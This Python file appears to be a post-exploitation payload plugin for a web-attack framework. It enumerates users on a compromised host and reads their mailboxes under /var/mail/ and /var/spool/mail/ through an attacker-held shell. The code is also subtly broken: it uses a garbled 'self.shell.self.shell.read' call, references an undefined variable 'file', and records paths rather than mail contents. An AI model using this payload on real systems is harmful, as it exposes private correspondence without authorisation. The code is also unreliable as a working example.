import re
from plugins.attack.payloads.base_payload import base_payload

class read_mail(base_payload):
    '''
    This payload shows local mails stored on /var/mail/
    '''
    def api_read(self):
        result = []
        directory = []

        directory.append('/var/mail/')
        directory.append('/var/spool/mail/')

        users = self.exec_payload('users_name')
        for direct in directory:
            for user in users:
                if self.shell.self.shell.read(direct+user) != '':
                    result.append('-------------------------')
                    result.append('FILE => '+file)
                    result.append(direct+user)

        result = [p for p in result if p != '']
        return result
        
    def run_read(self):
        result = self.api_read()
        if result == [ ]:
            result.append('No stored mail found.')
        return result